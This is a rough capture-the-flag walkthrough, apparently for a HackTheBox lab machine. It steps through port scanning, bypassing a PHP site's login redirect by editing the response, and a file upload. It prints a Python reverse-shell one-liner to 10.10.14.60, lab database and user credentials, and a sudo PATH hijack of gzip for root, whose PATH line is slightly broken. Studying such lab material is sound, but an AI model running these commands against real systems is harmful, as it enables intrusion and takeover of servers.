start with nmap

80
22



***

http 80

site uses php.

/index.php
/js
/accounts.php
/config.php
/download.php
/login.php

login.php --> tried sql bypass

***

status.php --> two admins, server is mysql

***

send req to /account.php and intercept response.

make response from 302 Found to 200 Ok

we get /account.php now we can create user.

create new user.

log in as new user.

file upload fun found

we found password for mysql: `mySQL_p@ssw0rd!:)`

user found :

m4lwhere
htbadmin
akshay

***

analysing download.php

it log all download file attempt to /var/www/file_access.log .

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.60",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

m4lwhere : $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.  : ilovecody112235!

***

privs

we can run /opt/scripts/access_backup.sh as root.

```bash
#!/bin/bash                                                                                                    [28/66]
                                                                                                                      
# We always make sure to store logs, we take security SERIOUSLY here
                                                                                                                      
# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time
                                                           
gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz


```

it uses gzip without full path specification

add /tmp/gzip

echo "/bin/bash" > /tmp/gzip
chmod +x /tmp/gzip
export PATH=/tmp/gzip:$PATH

sudo -u root ./access_backup.sh